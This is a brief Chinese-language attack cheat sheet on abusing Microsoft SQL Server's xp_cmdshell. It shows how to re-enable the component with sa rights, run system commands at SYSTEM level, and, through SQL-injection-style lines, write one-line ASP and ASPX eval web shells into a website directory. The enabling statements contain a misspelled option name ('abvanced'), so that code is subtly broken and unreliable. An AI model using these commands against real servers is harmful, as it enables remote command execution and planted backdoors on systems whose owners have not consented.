## 介绍
sqlserver默认有个组件sys.xp_cmdshell，这个组件可以调用cmd命令。


## 条件
```
开启xp_cmdshell
    在mssql2000中默认是开启的，mssql2005以后是关闭的
```

## 开启xp_cmdshell
如果拥有管理员的sa权限，则可以用sp_configure重新开启它
```
EXEC sp_configure 'show abvanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;
```
分步骤开启xp_cmdshell
```
允许修改高级参数
    EXEC sp_configure 'show abvanced options',1;
    RECONFIGURE;
打开xp_cmdshell扩展
    exec sp_configure 'xp_cmdshell',1;
    reconfigure;
```
关闭
```
允许修改高级参数
    EXEC sp_configure 'show abvanced options',1;
    RECONFIGURE;
关闭xp_cmdshell扩展
    exec sp_configure 'xp_cmdshell',0;
    reconfigure;
```
## 执行系统命令
为最高权限system。
```
exec master.dbo.xp_cmdshell 'ipconfig'
```

## []()getshell

```
exec master.dbo.xp_cmdshell 'echo^<%eval request(chr(35))%^> > 网站目录\a.asp' --+
 exec master.dbo.xp_cmdshell 'echo^<%@ Page Language="Jscript"%^>^<%eval(Request.item["cmd"],"nusafe");%^> > 网站目录\a.asp' --+
```




